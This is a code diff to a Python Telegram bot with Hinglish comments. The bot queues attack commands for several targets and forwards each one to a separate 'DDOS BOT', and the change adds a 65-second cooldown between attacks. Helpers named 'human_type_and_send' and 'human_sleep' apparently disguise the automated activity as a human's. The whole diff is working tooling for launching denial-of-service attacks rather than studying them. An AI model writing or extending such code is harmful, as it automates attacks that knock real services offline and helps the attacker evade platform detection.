@@ -136,7 +136,6 @@ async def single_round_for_target(
     return final_cmd
 
 
-# ===== BATCH ROUND: MULTI‑TARGET QUEUE =====
 async def batch_round(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
     targets = multi_targets.get(chat_id, [])
     if not targets:
@@ -163,7 +162,7 @@ async def batch_round(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # 2) CMDs ko line‑se BOT_B ko bhejna
+    # 2) Har CMD ko DDOS bot pe bhejo + 65s cooldown
     for i, cmd in enumerate(active_cmds, start=1):
         await human_type_and_send(
             context,
@@ -171,8 +170,15 @@ async def batch_round(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
             f"🚀 {i}/{len(active_cmds)}: DDOS BOT ko bhej raha hu:`{cmd}`",
         )
         await tele.send_message(BOT_B, cmd)
-        await human_sleep(1.0, 3.0)
 
+        # DDOS bot agla attack 65s baad lega
+        if i != len(active_cmds):  # last ke baad wait nahi chahiye ho to
+            await human_type_and_send(
+                context,
+                chat_id,
+                "⏳ DDOS BOT cooldown: 65s wait kar raha hu next attack se pehle…",
+            )
+            await asyncio.sleep(65)
 
 # ===== AUTO LOOP (batch_round ke upar) =====
 async def autoloop_worker(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
